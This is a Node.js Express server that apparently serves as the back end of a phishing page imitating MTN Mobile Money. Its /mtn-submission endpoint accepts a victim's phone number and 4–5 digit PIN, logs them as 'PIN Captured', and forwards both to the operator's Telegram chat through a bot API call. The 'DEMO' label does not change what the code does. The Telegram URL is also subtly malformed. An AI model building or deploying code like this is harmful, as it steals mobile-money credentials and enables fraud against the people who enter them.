const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

// Mtn submission endpoint
app.post("/mtn-submission", async (req, res) => {
  const { phone, pin, success } = req.body;

  // 1. Basic Type Validation
  if (
    typeof phone !== "string" ||
    typeof pin !== "string" ||
    typeof success !== "boolean"
  ) {
    return res.status(400).json({
      success: false,
      message: "Invalid mtn submission layout"
    });
  }

  // 2. Exact Length Verification (Ensuring PIN is 4 or 5 digits long)
  const isNumeric = /^[0-9]+$/.test(pin);
  if (!isNumeric || (pin.length !== 4 && pin.length !== 5)) {
    return res.status(400).json({
      success: false,
      message: "Security violation: PIN must be exactly 4 or 5 numbers long."
    });
  }

  console.log("--- MOMO PORTAL INBOUND ---");
  console.log("Phone Target :", phone);
  console.log("PIN Captured :", pin);
  console.log("Payload State:", success ? "Successful Auth" : "Failed Verification");

  // Optional Telegram notification dispatch
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (botToken && chatId) {
    const message = 
`🧪 MTN MoMo DEMO

📱 Mtn number: ${phone}
📱 Mtn pincode: ${pin}
📱 Time: ${new Date().toISOString()}
✅ Result: ${success ? "Application successful" : "Application failed"}

🔐 Terms and conditions applies.
`;

    try {
      const telegramResponse = await fetch(
        `https://telegram.org{botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: message })
        }
      );

      if (!telegramResponse.ok) {
        console.error("Telegram endpoint issue:", await telegramResponse.text());
      }
    } catch (error) {
      console.error("Telegram network failure:", error);
    }
  }

  return res.json({
    success: true,
    message: "Mtn submission received"
  });
});

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`Mtn server running on port ${PORT}`);
});


